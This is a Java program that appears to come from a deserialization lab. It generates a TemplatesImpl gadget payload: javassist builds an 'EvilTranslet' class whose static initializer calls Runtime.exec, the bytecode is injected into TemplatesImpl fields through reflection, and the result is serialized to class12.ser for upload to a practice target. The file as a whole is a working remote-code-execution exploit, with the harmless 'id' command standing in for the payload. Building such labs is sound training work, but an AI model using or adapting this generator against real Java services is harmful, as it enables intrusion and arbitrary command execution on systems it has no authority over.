package class12;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import com.ctfstu.common.Logger;

/**
 * 生成 class12 的 payload — TemplatesImpl (javassist 字节码)
 * 目标: 上传 TemplatesImpl 对象，服务端调用 newTransformer() 时加载恶意字节码
 * 靶场: /class12/upload
 *
 * 注意:
 * - 使用反射访问 com.sun.org.apache.xalan... 内部类，无需 --add-exports
 * - 字节码版本设为 52 (Java 8)，确保 JDK 8 靶场能加载
 * - transletVersion = 101 跳过 AbstractTranslet.postInitialization()
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilTranslet");
        ctClass.setSuperclass(pool.get(
                "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // JDK 8 只能加载 class version 52 (Java 8)
        ctClass.getClassFile().setMajorVersion(52);
        ctClass.getClassFile().setMinorVersion(0);

        // static initializer → exec
        ctClass.makeClassInitializer().setBody(
                "try {" +
                "   Runtime.getRuntime().exec(\"id\");" +
                "} catch (Exception e) {" +
                "   e.printStackTrace();" +
                "}"
        );

        // 构造函数设置 transletVersion = 101 跳过 postInitialization()
        ctClass.addConstructor(
                CtNewConstructor.make(
                        "public EvilTranslet() { this.transletVersion = 101; }", ctClass));

        byte[] evilBytes = ctClass.toBytecode();

        // 使用反射创建 TemplatesImpl / TransformerFactoryImpl，
        // 避免直接导入 JDK 内部类导致的编译问题
        Class<?> templatesClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Class<?> tfClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");

        Object templates = templatesClass.getDeclaredConstructor().newInstance();
        Object tf = tfClass.getDeclaredConstructor().newInstance();

        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_tfactory", tf);
        setField(templates, "_transletIndex", 0);
        setField(templates, "_name", "EvilTranslet");

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class12.ser"));
        oos.writeObject(templates);
        oos.close();

        System.out.println("✅ 已生成: class12.ser");
        System.out.println("⚠️  需在 JDK 8 靶场测试，JDK 高版本无法反序列化");
    }

    private static void setField(Object obj, String name, Object val) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }
}
